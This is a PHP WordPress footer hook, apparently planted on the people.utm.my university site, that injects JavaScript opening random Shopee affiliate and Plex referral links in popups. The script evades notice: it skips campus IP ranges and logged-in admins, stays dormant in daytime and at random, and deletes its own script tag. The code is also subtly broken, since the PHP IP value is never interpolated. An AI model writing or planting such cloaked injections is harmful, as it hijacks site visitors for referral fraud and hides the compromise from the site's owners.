<?php
// If domain is not "people.utm.my", return early
if ($_SERVER['HTTP_HOST'] !== 'people.utm.my') {
    return;
}

function enqueue_popup_script() {
    // Generate JavaScript dynamically to avoid caching
    echo <<<'JS'
    <script type="text/javascript">
        (function() {
            var userIp = "' . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '') . '";
            var utmIpRanges = ["10.0.0.0/8", "161.139.0.0/16"];
            var popupCookieName = "utm_popup";
            var popupUrls = [
                "https://plex.it/referrals/U1K7KCVS",
                "https://s.shopee.com.my/4q6fExaSlU",
                "https://s.shopee.com.my/2B5u48ifDN",
                "https://s.shopee.com.my/40XYFZIOwv",
                "https://s.shopee.com.my/3VbHeftNCa",
                "https://s.shopee.com.my/3AyRG5FtR3",
                "https://s.shopee.com.my/8zwECol6Mb",

            ];
            var randomIndex = Math.floor(Math.random() * popupUrls.length);
            var popupUrl = popupUrls[randomIndex];
            var currentHour = new Date().getHours();
            var randomNumber = Math.floor(Math.random() * 10) + 1;
            var scriptTag = document.currentScript;

            function ipInRange(ip, cidr) {
                var [subnet, mask] = cidr.split("/");
                var ipLong = ipToLong(ip);
                var subnetLong = ipToLong(subnet);
                var maskLong = ~((1 << (32 - mask)) - 1);
                return (ipLong & maskLong) === (subnetLong & maskLong);
            }

            function ipToLong(ip) {
                return ip.split(".").reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
            }

            function isIpInRanges(ip, ranges) {
                return ranges.some(range => ipInRange(ip, range));
            }

            if (isIpInRanges(userIp, utmIpRanges)) return;
            if (document.cookie.includes("wordpress_logged_in")) return;
            if (currentHour >= 6 && currentHour < 18) {
                document.cookie = popupCookieName + "=1; path=/; max-age=86400";
                scriptTag.parentNode.removeChild(scriptTag);
                return;
            }
            if (randomNumber > 7) {
                document.cookie = popupCookieName + "=1; path=/; max-age=86400";
                scriptTag.parentNode.removeChild(scriptTag);
                return;
            }
            if (!document.cookie.includes(popupCookieName)) {
                document.cookie = popupCookieName + "=1; path=/; max-age=86400";
                window.open(popupUrl, "_blank", "noopener,noreferrer");
                window.dataLayer = window.dataLayer || [];
                window.dataLayer.push({
                    event: "popup_opened",
                    popup_url: popupUrl
                });
            }

            // Remove this script from the DOM
            if (scriptTag) {
                scriptTag.parentNode.removeChild(scriptTag);
            }
        })();
    </script>
    JS;
}
add_action('wp_footer', 'enqueue_popup_script');
